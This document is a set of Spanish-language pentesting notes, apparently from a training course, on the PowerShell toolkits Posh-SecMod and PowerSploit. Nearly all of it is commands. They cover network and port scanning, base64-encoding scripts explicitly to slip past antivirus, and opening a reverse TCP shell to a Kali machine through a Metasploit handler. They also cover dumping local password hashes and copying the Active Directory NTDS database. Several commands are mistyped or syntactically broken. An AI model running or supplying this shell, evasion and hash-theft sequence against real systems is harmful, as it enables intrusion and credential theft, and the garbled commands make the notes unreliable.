conjunto de herramietas de powerShell para pentesting

-discovery: hacer escaneo de red
-utilities: descargar archivos gestionar hases
-registry: manipular el registro con wmi
-AUDIT: funciones de auditoria de sistemas (ver el numero de sesiones, informacion de usuarios del directorio activo)
-postExploit: trasformar codigo powerShell a base64, comprimir tamaño de los scripts,ejecutar procesos remotos. 

https://github.com/darkoperator/Posh-SecMod
#######################################################################################################################################################
-- Import-Module .\Posh-SecMod-master\Posh-SecMod.psm1
(poshSecMod tiene sub modulos)
-- (carpeta \Discovery>) Import-Module.\Discovery.psm1
-- Get-Command -Module Discovery (o usar Show-command y buscarlo)
(un escaneo ARP si tienen cortafuegos e impiden la respuesta a ping)
-- Invoke-ARPScan -CIDR 192.168.10.0/24
(si dos metodos de diferentes modulos se llaman igual, solo permanecera el metodo del ultimo modulo añadido y se anulara el otro )
--- Get-ChildItem.\Posh-SecMod-master\ -Recurse|Unblock-File
--- Import-Module.\PowerSploit-master\Powersploit.psml
--- Get-Help Invoke-Portscan
--- Invoke-Portscan -Hosts maquinaremota
$RESULTADO Invoke-Portscan -Hosts dc.adatum.com
$RESULTADO|Select-object -ExpandProperty openPorts
--- Get-Command -Module powerSloit (o usar Show-command y buscarlo)
--- Get-HttpStatus -Target maquinaremota -Path .\PowerSploit-master\Recon\Dictionaries\generic.txt
(where-object(s.Status -match"ok"} busca)
##################################################################################3###########################

-invokePINGScan -CIDR 192.168.10.0/24
-invoke-PortScan -taget ip -Ports 135,80,389,443,445,ect -Type TCP
(aparecen los puertos abiertos)

Comprimir un script 

-$variable= Compress-PostScript -File c:\ruta.ps1
(combertido a base64)
- powershell.exe -command $variable
(ejecuta el script comprimido que se guardo en la variable)

-Get-help ConverTo-PostBase64Command --Examples

- ConverTo-PostBase64Command -command "Get-Date"

(combierte a base 64 un comando de powerShell)
- powershell.exe -encodedcommand thfosyrfsjdodkkrgs(base64 codificado)
(puede servi para saltarse los antivirus al descargarlo en base64)

(shell inversa)
- $ShellKali= Get-PostReverTCPShell (ip kali, 4455)
(en kali)(configurar un handler)(abrir metasploit)
- msfconsole
-use exploit/multi/handler
- set PAYLOAD windows/shell/reverse_tcp
- set LHOST ip (kali)
- set LPORT 4455 (ejemplo)
- exploit
(en windows)
-powershell.exe -encodedcommand ShellKali
(en Kali)(se hbra establecido la conexion)(con la maquina windows)


(usuarios y hashes del sistema locales)
(windows)
- $hashes= Get-PostHashdumpScript (base64)
- powershell.exe -command $hashes
(puede usar una herramienta como ophcrack o HashKiller)
- Get-PostCopyNTDS (base de datos del directorio activo)

https://github.com/darkoperator/Posh-NVS